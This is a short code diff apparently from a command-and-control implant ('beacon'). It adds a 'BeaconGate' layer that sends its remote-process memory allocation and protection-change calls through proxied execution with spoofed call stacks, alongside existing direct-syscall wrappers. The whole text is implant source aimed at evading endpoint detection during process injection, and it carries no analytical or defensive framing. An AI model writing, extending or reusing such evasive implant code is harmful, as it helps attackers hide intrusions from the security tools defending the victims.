@@ -42,6 +42,7 @@
  * live in DR0-3; the gate samples and clears them on resolve and every
  * 128th dispatch. */
 #include <Windows.h>
+#include "beacon_gate.h" /* C-58 gate funnels */
 #include <string.h>
 #include "syscalls.h"
 #include "datastore.h"
@@ -796,6 +797,10 @@ LPVOID beacon_VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, D
 	PVOID base = lpAddress;
 	SIZE_T size = dwSize;
 
+	/* C-58 BeaconGate: proxied execution (spoofed stack when available) */
+	if (gate_api_enabled(GATE_API_VIRTUALALLOCEX))
+		return gate_VirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect);
+
 	if (syscall_method_get() == 0)
 		return VirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect);
 	st = sc_call_alloc(hProcess, &base, 0, &size, flAllocationType, flProtect);
@@ -811,6 +816,10 @@ BOOL beacon_VirtualProtectEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, D
 	PVOID base = lpAddress;
 	SIZE_T size = dwSize;
 	ULONG oldp = 0;
+
+	/* C-58 BeaconGate */
+	if (gate_api_enabled(GATE_API_VIRTUALPROTECTEX))
+		return gate_VirtualProtectEx(hProcess, lpAddress, dwSize, flNewProtect, lpflOldProtect);
 
 	if (syscall_method_get() == 0)
 		return VirtualProtectEx(hProcess, lpAddress, dwSize, flNewProtect, lpflOldProtect);
